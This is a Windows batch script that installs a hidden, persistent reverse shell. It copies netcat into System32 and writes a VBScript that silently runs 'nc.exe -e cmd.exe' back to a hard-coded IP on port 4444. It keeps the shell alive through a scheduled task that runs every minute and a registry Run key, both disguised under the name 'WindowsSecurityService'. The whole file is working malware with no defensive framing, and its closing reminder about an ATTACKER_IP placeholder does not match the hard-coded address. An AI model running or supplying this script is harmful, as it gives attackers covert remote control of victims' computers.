@echo off
:: Installs persistent reverse shell (hidden)

:: Copy netcat to system directory if needed
if not exist "C:\Windows\System32\nc.exe" (
    copy nc.exe C:\Windows\System32\nc.exe >nul 2>&1
    echo [+] Copied nc.exe to system directory
)

:: Create VBScript for hidden execution
echo Set WShell = CreateObject("WScript.Shell") > C:\Windows\System32\hidecmd.vbs
echo WShell.Run "cmd.exe /c C:\Windows\System32\nc.exe -e cmd.exe 192.168.0.106 4444", 0, False >> C:\Windows\System32\hidecmd.vbs
echo [+] Created VBScript for hidden execution

:: Create scheduled task to run VBScript
schtasks /create /tn "WindowsSecurityService" /tr "wscript.exe C:\Windows\System32\hidecmd.vbs" /sc minute /mo 1 /f >nul 2>&1
echo [+] Scheduled task created

:: Add VBScript to registry startup
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSecurityService" /t REG_SZ /d "wscript.exe C:\Windows\System32\hidecmd.vbs" /f >nul 2>&1
echo [+] Added to registry autostart

:: Modify target IP placeholder
echo [*] Remember to replace ATTACKER_IP with actual IP address